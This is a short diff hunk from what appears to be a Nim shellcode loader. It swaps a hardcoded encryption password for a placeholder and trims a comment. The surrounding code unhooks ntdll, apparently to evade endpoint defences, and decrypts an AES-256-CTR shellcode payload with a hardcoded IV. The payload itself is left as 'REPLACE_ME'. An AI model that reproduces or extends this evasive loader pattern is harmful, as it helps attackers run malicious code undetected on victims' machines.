@@ -117,13 +117,13 @@ proc shellcodeCallback(shellcode: openarray[byte]): void =
 
 
 when isMainModule:
-        let shellcode_base64_encrypted = "REPLACE_ME" #the easy way! replace me back if you need to remake your payload
+        let shellcode_base64_encrypted = "REPLACE_ME" 
         var result = ntdllunhook()  #so we need to assign it to a variable even though its not used. But if you discard it, it won't work... O_o
         var encodedIV: string = "t47unCor+GR9+cD+2d6FlQ==" #base64 encoded IV. hardcoded...fix this later
         var dctx: CTR[aes256]
         var enctext: seq[byte] = toByteSeq(decode(shellcode_base64_encrypted))
         var key: array[aes256.sizeKey, byte]
-        var envkey: string = "ReallyReallyLongAndComplicatedPasswordThatReallyDoesntEvenNeedToBeThatCrazyTbhBecauseWhoIsGonnaReverseItAndTheyWouldntEvenNeedThePassword"
+        var envkey: string = "PASSWORD_ME"
         var iv: array[aes256.sizeBlock, byte]
         var pp: string = decode(encodedIV)
 
